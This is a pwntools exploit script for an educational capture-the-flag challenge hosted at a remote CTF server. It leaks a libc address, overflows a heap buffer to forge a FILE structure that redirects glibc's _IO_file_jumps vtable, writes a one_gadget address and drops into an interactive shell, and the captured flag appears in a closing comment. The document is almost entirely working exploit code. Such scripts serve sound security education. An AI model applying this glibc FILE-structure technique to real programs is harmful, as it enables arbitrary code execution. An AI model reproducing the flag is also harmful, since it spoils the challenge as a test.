from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = "debug"

libc = ELF("./libc.so.6")

# io = gdb.debug("./chal", "c")
io = remote("edu-ctf.zoolab.org", 30217)
io.recvuntil(b"for you: ")
printf_addr = int(io.recvlineS().strip(), 16)
libc_base = printf_addr - libc.sym["printf"]
libc.address = libc_base
print(f"{libc_base = :#x}")
_IO_file_jumps = libc.sym["_IO_file_jumps"]
print(f"{_IO_file_jumps = :#x}")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    b"a" * 0x200
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000,
            0,
            0,
            0,
            0,
            0,
            0,
            _IO_file_jumps + 0x20,  # underflow
            _IO_file_jumps + 0x20 + 8,
            0,
            0,
            0,
            0,
            0,
            0,
        ]
    ),
)
io.sendlineafter(b"> ", b"4")
io.sendline(p64(libc_base + 0xE6C81))
io.interactive()

# FLAG{600d_mu51c_53r135_p4r7_3_youtu.be/dQw4w9WgXcQ}
